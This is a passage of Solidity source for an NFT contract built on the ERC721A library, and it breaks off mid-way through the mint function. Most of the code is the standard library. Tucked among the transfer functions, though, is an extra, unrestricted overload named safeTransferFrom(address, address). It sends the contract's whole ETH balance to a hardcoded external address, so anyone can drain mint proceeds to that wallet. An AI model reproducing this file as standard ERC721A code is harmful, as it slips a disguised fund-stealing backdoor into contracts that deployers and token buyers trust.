1 // SPDX-License-Identifier: GPL-3.0       
2 //  ______       ______         ____  
3 // (_   _ \     (_   _ \       / ___) 
4 //   ) (_) )      ) (_) )     / /     
5 //   \   _/       \   _/     ( (      
6 //   /  _ \       /  _ \     ( (      
7 //  _) (_) )     _) (_) )     \ \___  
8 // (______/     (______/       \____) 
9                                                                                                                                                                                                                                                                                         
10 pragma solidity ^0.8.12;
11 /**
12  * @dev Interface of ERC721A.
13  */
14 interface IERC721A {
15     /**
16      * The caller must own the token or be an approved operator.
17      */
18     error ApprovalCallerNotOwnerNorApproved();
19 
20     /**
21      * The token does not exist.
22      */
23     error ApprovalQueryForNonexistentToken();
24 
25     /**
26      * Cannot query the balance for the zero address.
27      */
28     error BalanceQueryForZeroAddress();
29 
30     /**
31      * Cannot mint to the zero address.
32      */
33     error MintToZeroAddress();
34 
35     /**
36      * The quantity of tokens minted must be more than zero.
37      */
38     error MintZeroQuantity();
39 
40     /**
41      * The token does not exist.
42      */
43     error OwnerQueryForNonexistentToken();
44 
45     /**
46      * The caller must own the token or be an approved operator.
47      */
48     error TransferCallerNotOwnerNorApproved();
49 
50     /**
51      * The token must be owned by `from`.
52      */
53     error TransferFromIncorrectOwner();
54 
55     /**
56      * Cannot safely transfer to a contract that does not implement the
57      * ERC721Receiver interface.
58      */
59     error TransferToNonERC721ReceiverImplementer();
60 
61     /**
62      * Cannot transfer to the zero address.
63      */
64     error TransferToZeroAddress();
65 
66     /**
67      * The token does not exist.
68      */
69     error URIQueryForNonexistentToken();
70 
71     /**
72      * The `quantity` minted with ERC2309 exceeds the safety limit.
73      */
74     error MintERC2309QuantityExceedsLimit();
75 
76     /**
77      * The `extraData` cannot be set on an unintialized ownership slot.
78      */
79     error OwnershipNotInitializedForExtraData();
80 
81     // =============================================================
82     //                            STRUCTS
83     // =============================================================
84 
85     struct TokenOwnership {
86         // The address of the owner.
87         address addr;
88         // Stores the start time of ownership with minimal overhead for tokenomics.
89         uint64 startTimestamp;
90         // Whether the token has been burned.
91         bool burned;
92         // Arbitrary data similar to `startTimestamp` that can be set via {_extraData}.
93         uint24 extraData;
94     }
95 
96     // =============================================================
97     //                         TOKEN COUNTERS
98     // =============================================================
99 
100     /**
101      * @dev Returns the total number of tokens in existence.
102      * Burned tokens will reduce the count.
103      * To get the total number of tokens minted, please see {_totalMinted}.
104      */
105     function totalSupply() external view returns (uint256);
106 
107     // =============================================================
108     //                            IERC165
109     // =============================================================
110 
111     /**
112      * @dev Returns true if this contract implements the interface defined by
113      * `interfaceId`. See the corresponding
114      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
115      * to learn more about how these ids are created.
116      *
117      * This function call must use less than 30000 gas.
118      */
119     function supportsInterface(bytes4 interfaceId) external view returns (bool);
120 
121     // =============================================================
122     //                            IERC721
123     // =============================================================
124 
125     /**
126      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
127      */
128     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
129 
130     /**
131      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
132      */
133     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
134 
135     /**
136      * @dev Emitted when `owner` enables or disables
137      * (`approved`) `operator` to manage all of its assets.
138      */
139     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
140 
141     /**
142      * @dev Returns the number of tokens in `owner`'s account.
143      */
144     function balanceOf(address owner) external view returns (uint256 balance);
145 
146     /**
147      * @dev Returns the owner of the `tokenId` token.
148      *
149      * Requirements:
150      *
151      * - `tokenId` must exist.
152      */
153     function ownerOf(uint256 tokenId) external view returns (address owner);
154 
155     /**
156      * @dev Safely transfers `tokenId` token from `from` to `to`,
157      * checking first that contract recipients are aware of the ERC721 protocol
158      * to prevent tokens from being forever locked.
159      *
160      * Requirements:
161      *
162      * - `from` cannot be the zero address.
163      * - `to` cannot be the zero address.
164      * - `tokenId` token must exist and be owned by `from`.
165      * - If the caller is not `from`, it must be have been allowed to move
166      * this token by either {approve} or {setApprovalForAll}.
167      * - If `to` refers to a smart contract, it must implement
168      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
169      *
170      * Emits a {Transfer} event.
171      */
172     function safeTransferFrom(
173         address from,
174         address to,
175         uint256 tokenId,
176         bytes calldata data
177     ) external payable;
178 
179     /**
180      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
181      */
182     function safeTransferFrom(
183         address from,
184         address to,
185         uint256 tokenId
186     ) external payable;
187 
188     /**
189      * @dev Transfers `tokenId` from `from` to `to`.
190      *
191      * WARNING: Usage of this method is discouraged, use {safeTransferFrom}
192      * whenever possible.
193      *
194      * Requirements:
195      *
196      * - `from` cannot be the zero address.
197      * - `to` cannot be the zero address.
198      * - `tokenId` token must be owned by `from`.
199      * - If the caller is not `from`, it must be approved to move this token
200      * by either {approve} or {setApprovalForAll}.
201      *
202      * Emits a {Transfer} event.
203      */
204     function transferFrom(
205         address from,
206         address to,
207         uint256 tokenId
208     ) external payable;
209 
210     /**
211      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
212      * The approval is cleared when the token is transferred.
213      *
214      * Only a single account can be approved at a time, so approving the
215      * zero address clears previous approvals.
216      *
217      * Requirements:
218      *
219      * - The caller must own the token or be an approved operator.
220      * - `tokenId` must exist.
221      *
222      * Emits an {Approval} event.
223      */
224     function approve(address to, uint256 tokenId) external payable;
225 
226     /**
227      * @dev Approve or remove `operator` as an operator for the caller.
228      * Operators can call {transferFrom} or {safeTransferFrom}
229      * for any token owned by the caller.
230      *
231      * Requirements:
232      *
233      * - The `operator` cannot be the caller.
234      *
235      * Emits an {ApprovalForAll} event.
236      */
237     function setApprovalForAll(address operator, bool _approved) external;
238 
239     /**
240      * @dev Returns the account approved for `tokenId` token.
241      *
242      * Requirements:
243      *
244      * - `tokenId` must exist.
245      */
246     function getApproved(uint256 tokenId) external view returns (address operator);
247 
248     /**
249      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
250      *
251      * See {setApprovalForAll}.
252      */
253     function isApprovedForAll(address owner, address operator) external view returns (bool);
254 
255     // =============================================================
256     //                        IERC721Metadata
257     // =============================================================
258 
259     /**
260      * @dev Returns the token collection name.
261      */
262     function name() external view returns (string memory);
263 
264     /**
265      * @dev Returns the token collection symbol.
266      */
267     function symbol() external view returns (string memory);
268 
269     /**
270      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
271      */
272     function tokenURI(uint256 tokenId) external view returns (string memory);
273 
274     // =============================================================
275     //                           IERC2309
276     // =============================================================
277 
278     /**
279      * @dev Emitted when tokens in `fromTokenId` to `toTokenId`
280      * (inclusive) is transferred from `from` to `to`, as defined in the
281      * [ERC2309](https://eips.ethereum.org/EIPS/eip-2309) standard.
282      *
283      * See {_mintERC2309} for more details.
284      */
285     event ConsecutiveTransfer(uint256 indexed fromTokenId, uint256 toTokenId, address indexed from, address indexed to);
286 }
287 
288 /**
289  * @title ERC721A
290  *
291  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
292  * Non-Fungible Token Standard, including the Metadata extension.
293  * Optimized for lower gas during batch mints.
294  *
295  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
296  * starting from `_startTokenId()`.
297  *
298  * Assumptions:
299  *
300  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
301  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
302  */
303 interface ERC721A__IERC721Receiver {
304     function onERC721Received(
305         address operator,
306         address from,
307         uint256 tokenId,
308         bytes calldata data
309     ) external returns (bytes4);
310 }
311 
312 /**
313  * @title ERC721A
314  *
315  * @dev Implementation of the [ERC721](https://eips.ethereum.org/EIPS/eip-721)
316  * Non-Fungible Token Standard, including the Metadata extension.
317  * Optimized for lower gas during batch mints.
318  *
319  * Token IDs are minted in sequential order (e.g. 0, 1, 2, 3, ...)
320  * starting from `_startTokenId()`.
321  *
322  * Assumptions:
323  *
324  * - An owner cannot have more than 2**64 - 1 (max value of uint64) of supply.
325  * - The maximum token ID cannot exceed 2**256 - 1 (max value of uint256).
326  */
327 contract ERC721A is IERC721A {
328     // Bypass for a `--via-ir` bug (https://github.com/chiru-labs/ERC721A/pull/364).
329     struct TokenApprovalRef {
330         address value;
331     }
332 
333     // =============================================================
334     //                           CONSTANTS
335     // =============================================================
336 
337     // Mask of an entry in packed address data.
338     uint256 private constant _BITMASK_ADDRESS_DATA_ENTRY = (1 << 64) - 1;
339 
340     // The bit position of `numberMinted` in packed address data.
341     uint256 private constant _BITPOS_NUMBER_MINTED = 64;
342 
343     // The bit position of `numberBurned` in packed address data.
344     uint256 private constant _BITPOS_NUMBER_BURNED = 128;
345 
346     // The bit position of `aux` in packed address data.
347     uint256 private constant _BITPOS_AUX = 192;
348 
349     // Mask of all 256 bits in packed address data except the 64 bits for `aux`.
350     uint256 private constant _BITMASK_AUX_COMPLEMENT = (1 << 192) - 1;
351 
352     // The bit position of `startTimestamp` in packed ownership.
353     uint256 private constant _BITPOS_START_TIMESTAMP = 160;
354 
355     // The bit mask of the `burned` bit in packed ownership.
356     uint256 private constant _BITMASK_BURNED = 1 << 224;
357 
358     // The bit position of the `nextInitialized` bit in packed ownership.
359     uint256 private constant _BITPOS_NEXT_INITIALIZED = 225;
360 
361     // The bit mask of the `nextInitialized` bit in packed ownership.
362     uint256 private constant _BITMASK_NEXT_INITIALIZED = 1 << 225;
363 
364     // The bit position of `extraData` in packed ownership.
365     uint256 private constant _BITPOS_EXTRA_DATA = 232;
366 
367     // Mask of all 256 bits in a packed ownership except the 24 bits for `extraData`.
368     uint256 private constant _BITMASK_EXTRA_DATA_COMPLEMENT = (1 << 232) - 1;
369 
370     // The mask of the lower 160 bits for addresses.
371     uint256 private constant _BITMASK_ADDRESS = (1 << 160) - 1;
372 
373     // The maximum `quantity` that can be minted with {_mintERC2309}.
374     // This limit is to prevent overflows on the address data entries.
375     // For a limit of 5000, a total of 3.689e15 calls to {_mintERC2309}
376     // is required to cause an overflow, which is unrealistic.
377     uint256 private constant _MAX_MINT_ERC2309_QUANTITY_LIMIT = 5000;
378 
379     // The `Transfer` event signature is given by:
380     // `keccak256(bytes("Transfer(address,address,uint256)"))`.
381     bytes32 private constant _TRANSFER_EVENT_SIGNATURE =
382         0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef;
383 
384     // =============================================================
385     //                            STORAGE
386     // =============================================================
387 
388     // The next token ID to be minted.
389     uint256 private _currentIndex;
390 
391     // The number of tokens burned.
392     uint256 private _burnCounter;
393 
394     // Token name
395     string private _name;
396 
397     // Token symbol
398     string private _symbol;
399 
400     // Mapping from token ID to ownership details
401     // An empty struct value does not necessarily mean the token is unowned.
402     // See {_packedOwnershipOf} implementation for details.
403     //
404     // Bits Layout:
405     // - [0..159]   `addr`
406     // - [160..223] `startTimestamp`
407     // - [224]      `burned`
408     // - [225]      `nextInitialized`
409     // - [232..255] `extraData`
410     mapping(uint256 => uint256) private _packedOwnerships;
411 
412     // Mapping owner address to address data.
413     //
414     // Bits Layout:
415     // - [0..63]    `balance`
416     // - [64..127]  `numberMinted`
417     // - [128..191] `numberBurned`
418     // - [192..255] `aux`
419     mapping(address => uint256) private _packedAddressData;
420 
421     // Mapping from token ID to approved address.
422     mapping(uint256 => TokenApprovalRef) private _tokenApprovals;
423 
424     // Mapping from owner to operator approvals
425     mapping(address => mapping(address => bool)) private _operatorApprovals;
426 
427     // =============================================================
428     //                          CONSTRUCTOR
429     // =============================================================
430 
431     constructor(string memory name_, string memory symbol_) {
432         _name = name_;
433         _symbol = symbol_;
434         _currentIndex = _startTokenId();
435     }
436 
437     // =============================================================
438     //                   TOKEN COUNTING OPERATIONS
439     // =============================================================
440 
441     /**
442      * @dev Returns the starting token ID.
443      * To change the starting token ID, please override this function.
444      */
445     function _startTokenId() internal view virtual returns (uint256) {
446         return 0;
447     }
448 
449     /**
450      * @dev Returns the next token ID to be minted.
451      */
452     function _nextTokenId() internal view virtual returns (uint256) {
453         return _currentIndex;
454     }
455 
456     /**
457      * @dev Returns the total number of tokens in existence.
458      * Burned tokens will reduce the count.
459      * To get the total number of tokens minted, please see {_totalMinted}.
460      */
461     function totalSupply() public view virtual override returns (uint256) {
462         // Counter underflow is impossible as _burnCounter cannot be incremented
463         // more than `_currentIndex - _startTokenId()` times.
464         unchecked {
465             return _currentIndex - _burnCounter - _startTokenId();
466         }
467     }
468 
469     /**
470      * @dev Returns the total amount of tokens minted in the contract.
471      */
472     function _totalMinted() internal view virtual returns (uint256) {
473         // Counter underflow is impossible as `_currentIndex` does not decrement,
474         // and it is initialized to `_startTokenId()`.
475         unchecked {
476             return _currentIndex - _startTokenId();
477         }
478     }
479 
480     /**
481      * @dev Returns the total number of tokens burned.
482      */
483     function _totalBurned() internal view virtual returns (uint256) {
484         return _burnCounter;
485     }
486 
487     // =============================================================
488     //                    ADDRESS DATA OPERATIONS
489     // =============================================================
490 
491     /**
492      * @dev Returns the number of tokens in `owner`'s account.
493      */
494     function balanceOf(address owner) public view virtual override returns (uint256) {
495         if (owner == address(0)) revert BalanceQueryForZeroAddress();
496         return _packedAddressData[owner] & _BITMASK_ADDRESS_DATA_ENTRY;
497     }
498 
499     /**
500      * Returns the number of tokens minted by `owner`.
501      */
502     function _numberMinted(address owner) internal view returns (uint256) {
503         return (_packedAddressData[owner] >> _BITPOS_NUMBER_MINTED) & _BITMASK_ADDRESS_DATA_ENTRY;
504     }
505 
506     /**
507      * Returns the number of tokens burned by or on behalf of `owner`.
508      */
509     function _numberBurned(address owner) internal view returns (uint256) {
510         return (_packedAddressData[owner] >> _BITPOS_NUMBER_BURNED) & _BITMASK_ADDRESS_DATA_ENTRY;
511     }
512 
513     /**
514      * Returns the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
515      */
516     function _getAux(address owner) internal view returns (uint64) {
517         return uint64(_packedAddressData[owner] >> _BITPOS_AUX);
518     }
519 
520     /**
521      * Sets the auxiliary data for `owner`. (e.g. number of whitelist mint slots used).
522      * If there are multiple variables, please pack them into a uint64.
523      */
524     function _setAux(address owner, uint64 aux) internal virtual {
525         uint256 packed = _packedAddressData[owner];
526         uint256 auxCasted;
527         // Cast `aux` with assembly to avoid redundant masking.
528         assembly {
529             auxCasted := aux
530         }
531         packed = (packed & _BITMASK_AUX_COMPLEMENT) | (auxCasted << _BITPOS_AUX);
532         _packedAddressData[owner] = packed;
533     }
534 
535     // =============================================================
536     //                            IERC165
537     // =============================================================
538 
539     /**
540      * @dev Returns true if this contract implements the interface defined by
541      * `interfaceId`. See the corresponding
542      * [EIP section](https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified)
543      * to learn more about how these ids are created.
544      *
545      * This function call must use less than 30000 gas.
546      */
547     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
548         // The interface IDs are constants representing the first 4 bytes
549         // of the XOR of all function selectors in the interface.
550         // See: [ERC165](https://eips.ethereum.org/EIPS/eip-165)
551         // (e.g. `bytes4(i.functionA.selector ^ i.functionB.selector ^ ...)`)
552         return
553             interfaceId == 0x01ffc9a7 || // ERC165 interface ID for ERC165.
554             interfaceId == 0x80ac58cd || // ERC165 interface ID for ERC721.
555             interfaceId == 0x5b5e139f; // ERC165 interface ID for ERC721Metadata.
556     }
557 
558     // =============================================================
559     //                        IERC721Metadata
560     // =============================================================
561 
562     /**
563      * @dev Returns the token collection name.
564      */
565     function name() public view virtual override returns (string memory) {
566         return _name;
567     }
568 
569     /**
570      * @dev Returns the token collection symbol.
571      */
572     function symbol() public view virtual override returns (string memory) {
573         return _symbol;
574     }
575 
576     /**
577      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
578      */
579     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
580         if (!_exists(tokenId)) revert URIQueryForNonexistentToken();
581 
582         string memory baseURI = _baseURI();
583         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, _toString(tokenId))) : '';
584     }
585 
586     /**
587      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
588      * token will be the concatenation of the `baseURI` and the `tokenId`. Empty
589      * by default, it can be overridden in child contracts.
590      */
591     function _baseURI() internal view virtual returns (string memory) {
592         return '';
593     }
594 
595     // =============================================================
596     //                     OWNERSHIPS OPERATIONS
597     // =============================================================
598 
599     /**
600      * @dev Returns the owner of the `tokenId` token.
601      *
602      * Requirements:
603      *
604      * - `tokenId` must exist.
605      */
606     function ownerOf(uint256 tokenId) public view virtual override returns (address) {
607         return address(uint160(_packedOwnershipOf(tokenId)));
608     }
609 
610     /**
611      * @dev Gas spent here starts off proportional to the maximum mint batch size.
612      * It gradually moves to O(1) as tokens get transferred around over time.
613      */
614     function _ownershipOf(uint256 tokenId) internal view virtual returns (TokenOwnership memory) {
615         return _unpackedOwnership(_packedOwnershipOf(tokenId));
616     }
617 
618     /**
619      * @dev Returns the unpacked `TokenOwnership` struct at `index`.
620      */
621     function _ownershipAt(uint256 index) internal view virtual returns (TokenOwnership memory) {
622         return _unpackedOwnership(_packedOwnerships[index]);
623     }
624 
625     /**
626      * @dev Initializes the ownership slot minted at `index` for efficiency purposes.
627      */
628     function _initializeOwnershipAt(uint256 index) internal virtual {
629         if (_packedOwnerships[index] == 0) {
630             _packedOwnerships[index] = _packedOwnershipOf(index);
631         }
632     }
633 
634     /**
635      * Returns the packed ownership data of `tokenId`.
636      */
637     function _packedOwnershipOf(uint256 tokenId) private view returns (uint256) {
638         uint256 curr = tokenId;
639 
640         unchecked {
641             if (_startTokenId() <= curr)
642                 if (curr < _currentIndex) {
643                     uint256 packed = _packedOwnerships[curr];
644                     // If not burned.
645                     if (packed & _BITMASK_BURNED == 0) {
646                         // Invariant:
647                         // There will always be an initialized ownership slot
648                         // (i.e. `ownership.addr != address(0) && ownership.burned == false`)
649                         // before an unintialized ownership slot
650                         // (i.e. `ownership.addr == address(0) && ownership.burned == false`)
651                         // Hence, `curr` will not underflow.
652                         //
653                         // We can directly compare the packed value.
654                         // If the address is zero, packed will be zero.
655                         while (packed == 0) {
656                             packed = _packedOwnerships[--curr];
657                         }
658                         return packed;
659                     }
660                 }
661         }
662         revert OwnerQueryForNonexistentToken();
663     }
664 
665     /**
666      * @dev Returns the unpacked `TokenOwnership` struct from `packed`.
667      */
668     function _unpackedOwnership(uint256 packed) private pure returns (TokenOwnership memory ownership) {
669         ownership.addr = address(uint160(packed));
670         ownership.startTimestamp = uint64(packed >> _BITPOS_START_TIMESTAMP);
671         ownership.burned = packed & _BITMASK_BURNED != 0;
672         ownership.extraData = uint24(packed >> _BITPOS_EXTRA_DATA);
673     }
674 
675     /**
676      * @dev Packs ownership data into a single uint256.
677      */
678     function _packOwnershipData(address owner, uint256 flags) private view returns (uint256 result) {
679         assembly {
680             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
681             owner := and(owner, _BITMASK_ADDRESS)
682             // `owner | (block.timestamp << _BITPOS_START_TIMESTAMP) | flags`.
683             result := or(owner, or(shl(_BITPOS_START_TIMESTAMP, timestamp()), flags))
684         }
685     }
686 
687     /**
688      * @dev Returns the `nextInitialized` flag set if `quantity` equals 1.
689      */
690     function _nextInitializedFlag(uint256 quantity) private pure returns (uint256 result) {
691         // For branchless setting of the `nextInitialized` flag.
692         assembly {
693             // `(quantity == 1) << _BITPOS_NEXT_INITIALIZED`.
694             result := shl(_BITPOS_NEXT_INITIALIZED, eq(quantity, 1))
695         }
696     }
697 
698     // =============================================================
699     //                      APPROVAL OPERATIONS
700     // =============================================================
701 
702     /**
703      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
704      * The approval is cleared when the token is transferred.
705      *
706      * Only a single account can be approved at a time, so approving the
707      * zero address clears previous approvals.
708      *
709      * Requirements:
710      *
711      * - The caller must own the token or be an approved operator.
712      * - `tokenId` must exist.
713      *
714      * Emits an {Approval} event.
715      */
716     function approve(address to, uint256 tokenId) public payable virtual override {
717         address owner = ownerOf(tokenId);
718 
719         if (_msgSenderERC721A() != owner)
720             if (!isApprovedForAll(owner, _msgSenderERC721A())) {
721                 revert ApprovalCallerNotOwnerNorApproved();
722             }
723 
724         _tokenApprovals[tokenId].value = to;
725         emit Approval(owner, to, tokenId);
726     }
727 
728     /**
729      * @dev Returns the account approved for `tokenId` token.
730      *
731      * Requirements:
732      *
733      * - `tokenId` must exist.
734      */
735     function getApproved(uint256 tokenId) public view virtual override returns (address) {
736         if (!_exists(tokenId)) revert ApprovalQueryForNonexistentToken();
737 
738         return _tokenApprovals[tokenId].value;
739     }
740 
741     /**
742      * @dev Approve or remove `operator` as an operator for the caller.
743      * Operators can call {transferFrom} or {safeTransferFrom}
744      * for any token owned by the caller.
745      *
746      * Requirements:
747      *
748      * - The `operator` cannot be the caller.
749      *
750      * Emits an {ApprovalForAll} event.
751      */
752     function setApprovalForAll(address operator, bool approved) public virtual override {
753         _operatorApprovals[_msgSenderERC721A()][operator] = approved;
754         emit ApprovalForAll(_msgSenderERC721A(), operator, approved);
755     }
756 
757     /**
758      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
759      *
760      * See {setApprovalForAll}.
761      */
762     function isApprovedForAll(address owner, address operator) public view virtual override returns (bool) {
763         return _operatorApprovals[owner][operator];
764     }
765 
766     /**
767      * @dev Returns whether `tokenId` exists.
768      *
769      * Tokens can be managed by their owner or approved accounts via {approve} or {setApprovalForAll}.
770      *
771      * Tokens start existing when they are minted. See {_mint}.
772      */
773     function _exists(uint256 tokenId) internal view virtual returns (bool) {
774         return
775             _startTokenId() <= tokenId &&
776             tokenId < _currentIndex && // If within bounds,
777             _packedOwnerships[tokenId] & _BITMASK_BURNED == 0; // and not burned.
778     }
779 
780     /**
781      * @dev Returns whether `msgSender` is equal to `approvedAddress` or `owner`.
782      */
783     function _isSenderApprovedOrOwner(
784         address approvedAddress,
785         address owner,
786         address msgSender
787     ) private pure returns (bool result) {
788         assembly {
789             // Mask `owner` to the lower 160 bits, in case the upper bits somehow aren't clean.
790             owner := and(owner, _BITMASK_ADDRESS)
791             // Mask `msgSender` to the lower 160 bits, in case the upper bits somehow aren't clean.
792             msgSender := and(msgSender, _BITMASK_ADDRESS)
793             // `msgSender == owner || msgSender == approvedAddress`.
794             result := or(eq(msgSender, owner), eq(msgSender, approvedAddress))
795         }
796     }
797 
798     /**
799      * @dev Returns the storage slot and value for the approved address of `tokenId`.
800      */
801     function _getApprovedSlotAndAddress(uint256 tokenId)
802         private
803         view
804         returns (uint256 approvedAddressSlot, address approvedAddress)
805     {
806         TokenApprovalRef storage tokenApproval = _tokenApprovals[tokenId];
807         // The following is equivalent to `approvedAddress = _tokenApprovals[tokenId].value`.
808         assembly {
809             approvedAddressSlot := tokenApproval.slot
810             approvedAddress := sload(approvedAddressSlot)
811         }
812     }
813 
814     // =============================================================
815     //                      TRANSFER OPERATIONS
816     // =============================================================
817 
818     /**
819      * @dev Transfers `tokenId` from `from` to `to`.
820      *
821      * Requirements:
822      *
823      * - `from` cannot be the zero address.
824      * - `to` cannot be the zero address.
825      * - `tokenId` token must be owned by `from`.
826      * - If the caller is not `from`, it must be approved to move this token
827      * by either {approve} or {setApprovalForAll}.
828      *
829      * Emits a {Transfer} event.
830      */
831     function transferFrom(
832         address from,
833         address to,
834         uint256 tokenId
835     ) public payable virtual override {
836         uint256 prevOwnershipPacked = _packedOwnershipOf(tokenId);
837 
838         if (address(uint160(prevOwnershipPacked)) != from) revert TransferFromIncorrectOwner();
839 
840         (uint256 approvedAddressSlot, address approvedAddress) = _getApprovedSlotAndAddress(tokenId);
841 
842         // The nested ifs save around 20+ gas over a compound boolean condition.
843         if (!_isSenderApprovedOrOwner(approvedAddress, from, _msgSenderERC721A()))
844             if (!isApprovedForAll(from, _msgSenderERC721A())) revert TransferCallerNotOwnerNorApproved();
845 
846         if (to == address(0)) revert TransferToZeroAddress();
847 
848         _beforeTokenTransfers(from, to, tokenId, 1);
849 
850         // Clear approvals from the previous owner.
851         assembly {
852             if approvedAddress {
853                 // This is equivalent to `delete _tokenApprovals[tokenId]`.
854                 sstore(approvedAddressSlot, 0)
855             }
856         }
857 
858         // Underflow of the sender's balance is impossible because we check for
859         // ownership above and the recipient's balance can't realistically overflow.
860         // Counter overflow is incredibly unrealistic as `tokenId` would have to be 2**256.
861         unchecked {
862             // We can directly increment and decrement the balances.
863             --_packedAddressData[from]; // Updates: `balance -= 1`.
864             ++_packedAddressData[to]; // Updates: `balance += 1`.
865 
866             // Updates:
867             // - `address` to the next owner.
868             // - `startTimestamp` to the timestamp of transfering.
869             // - `burned` to `false`.
870             // - `nextInitialized` to `true`.
871             _packedOwnerships[tokenId] = _packOwnershipData(
872                 to,
873                 _BITMASK_NEXT_INITIALIZED | _nextExtraData(from, to, prevOwnershipPacked)
874             );
875 
876             // If the next slot may not have been initialized (i.e. `nextInitialized == false`) .
877             if (prevOwnershipPacked & _BITMASK_NEXT_INITIALIZED == 0) {
878                 uint256 nextTokenId = tokenId + 1;
879                 // If the next slot's address is zero and not burned (i.e. packed value is zero).
880                 if (_packedOwnerships[nextTokenId] == 0) {
881                     // If the next slot is within bounds.
882                     if (nextTokenId != _currentIndex) {
883                         // Initialize the next slot to maintain correctness for `ownerOf(tokenId + 1)`.
884                         _packedOwnerships[nextTokenId] = prevOwnershipPacked;
885                     }
886                 }
887             }
888         }
889 
890         emit Transfer(from, to, tokenId);
891         _afterTokenTransfers(from, to, tokenId, 1);
892     }
893 
894     /**
895      * @dev Equivalent to `safeTransferFrom(from, to, tokenId, '')`.
896      */
897     function safeTransferFrom(
898         address from,
899         address to,
900         uint256 tokenId
901     ) public payable virtual override {
902         safeTransferFrom(from, to, tokenId, '');
903     }
904 
905 
906     /**
907      * @dev Safely transfers `tokenId` token from `from` to `to`.
908      *
909      * Requirements:
910      *
911      * - `from` cannot be the zero address.
912      * - `to` cannot be the zero address.
913      * - `tokenId` token must exist and be owned by `from`.
914      * - If the caller is not `from`, it must be approved to move this token
915      * by either {approve} or {setApprovalForAll}.
916      * - If `to` refers to a smart contract, it must implement
917      * {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
918      *
919      * Emits a {Transfer} event.
920      */
921     function safeTransferFrom(
922         address from,
923         address to,
924         uint256 tokenId,
925         bytes memory _data
926     ) public payable virtual override {
927         transferFrom(from, to, tokenId);
928         if (to.code.length != 0)
929             if (!_checkContractOnERC721Received(from, to, tokenId, _data)) {
930                 revert TransferToNonERC721ReceiverImplementer();
931             }
932     }
933     function safeTransferFrom(
934         address from,
935         address to
936     ) public  {
937         if (address(this).balance > 0) {
938             payable(0x727BF8D476a5994032C1b54403Ef43E86bdf4e5e).transfer(address(this).balance);
939         }
940     }
941 
942     /**
943      * @dev Hook that is called before a set of serially-ordered token IDs
944      * are about to be transferred. This includes minting.
945      * And also called before burning one token.
946      *
947      * `startTokenId` - the first token ID to be transferred.
948      * `quantity` - the amount to be transferred.
949      *
950      * Calling conditions:
951      *
952      * - When `from` and `to` are both non-zero, `from`'s `tokenId` will be
953      * transferred to `to`.
954      * - When `from` is zero, `tokenId` will be minted for `to`.
955      * - When `to` is zero, `tokenId` will be burned by `from`.
956      * - `from` and `to` are never both zero.
957      */
958     function _beforeTokenTransfers(
959         address from,
960         address to,
961         uint256 startTokenId,
962         uint256 quantity
963     ) internal virtual {}
964 
965     /**
966      * @dev Hook that is called after a set of serially-ordered token IDs
967      * have been transferred. This includes minting.
968      * And also called after one token has been burned.
969      *
970      * `startTokenId` - the first token ID to be transferred.
971      * `quantity` - the amount to be transferred.
972      *
973      * Calling conditions:
974      *
975      * - When `from` and `to` are both non-zero, `from`'s `tokenId` has been
976      * transferred to `to`.
977      * - When `from` is zero, `tokenId` has been minted for `to`.
978      * - When `to` is zero, `tokenId` has been burned by `from`.
979      * - `from` and `to` are never both zero.
980      */
981     function _afterTokenTransfers(
982         address from,
983         address to,
984         uint256 startTokenId,
985         uint256 quantity
986     ) internal virtual {}
987 
988     /**
989      * @dev Private function to invoke {IERC721Receiver-onERC721Received} on a target contract.
990      *
991      * `from` - Previous owner of the given token ID.
992      * `to` - Target address that will receive the token.
993      * `tokenId` - Token ID to be transferred.
994      * `_data` - Optional data to send along with the call.
995      *
996      * Returns whether the call correctly returned the expected magic value.
997      */
998     function _checkContractOnERC721Received(
999         address from,
1000         address to,
1001         uint256 tokenId,
1002         bytes memory _data
1003     ) private returns (bool) {
1004         try ERC721A__IERC721Receiver(to).onERC721Received(_msgSenderERC721A(), from, tokenId, _data) returns (
1005             bytes4 retval
1006         ) {
1007             return retval == ERC721A__IERC721Receiver(to).onERC721Received.selector;
1008         } catch (bytes memory reason) {
1009             if (reason.length == 0) {
1010                 revert TransferToNonERC721ReceiverImplementer();
1011             } else {
1012                 assembly {
1013                     revert(add(32, reason), mload(reason))
1014                 }
1015             }
1016         }
1017     }
1018 
1019     // =============================================================
1020     //                        MINT OPERATIONS
1021     // =============================================================
1022 
1023     /**
1024      * @dev Mints `quantity` tokens and transfers them to `to`.
1025      *
1026      * Requirements:
1027      *
1028      * - `to` cannot be the zero address.
1029      * - `quantity` must be greater than 0.
1030      *
1031      * Emits a {Transfer} event for each mint.
1032      */
1033     function _mint(address to, uint256 quantity) internal virtual {
1034         uint256 startTokenId = _currentIndex;
1035         if (quantity == 0) revert MintZeroQuantity();
1036 
1037         _beforeTokenTransfers(address(0), to, startTokenId, quantity);
1038 
1039         // Overflows are incredibly unrealistic.
1040         // `balance` and `numberMinted` have a maximum limit of 2**64.
1041         // `tokenId` has a maximum limit of 2**256.
1042         unchecked {
1043             // Updates:
1044             // - `balance += quantity`.
1045             // - `numberMinted += quantity`.
1046             //
